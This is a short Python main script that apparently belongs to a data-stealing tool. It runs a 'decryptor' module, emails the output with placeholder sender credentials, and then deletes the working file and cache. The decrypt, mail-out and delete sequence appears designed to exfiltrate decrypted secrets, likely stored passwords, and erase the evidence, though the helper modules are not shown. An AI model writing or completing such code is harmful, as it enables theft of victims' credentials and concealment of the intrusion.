import decryptor
import utils

def main():
    decryptor.run()
    # Replace with your sender email and password
    EMAIL = "username"
    PASSWORD = "password"
    utils.send_mail(EMAIL, PASSWORD)
    utils.delete_file_or_folder(utils.FILE_PATH)
    utils.delete_file_or_folder(utils.CACHE_FILE)

if __name__ == '__main__':
    main()
